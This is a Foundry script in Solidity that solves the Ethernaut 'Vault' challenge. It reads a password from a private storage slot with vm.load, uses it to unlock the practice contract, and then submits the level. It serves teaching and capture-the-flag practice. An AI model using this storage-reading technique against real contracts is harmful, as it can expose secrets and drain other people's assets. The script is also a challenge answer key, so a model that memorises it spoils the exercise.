// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {Vault} from "../../challenge-contracts/08-Vault.sol";

contract VaultSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Run command `forge inspect Vault storage-layout --pretty` to get storage information:
        /*
        | Name     | Type    | Slot | Offset | Bytes | Contract                               |
        |----------|---------|------|--------|-------|----------------------------------------|
        | locked   | bool    | 0    | 0      | 1     | challenge-contracts/08-Vault.sol:Vault |
        | password | bytes32 | 1    | 0      | 32    | challenge-contracts/08-Vault.sol:Vault |
        */

        // Step 2: Load the password variable directly from the storage slot using vm.load;
        bytes32 retrievedPassword = vm.load(
            challengeInstance,
            bytes32(uint256(1))
        );
        console2.logBytes32(retrievedPassword);

        // Step 3: Use retrieved password to unlock the vault;
        Vault vault = Vault(challengeInstance);
        vault.unlock(retrievedPassword);

        // Step 4: Confirm that the vault is unlocked.
        require(vault.locked() == false, "Unlock check failed");

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(8));
    }
}
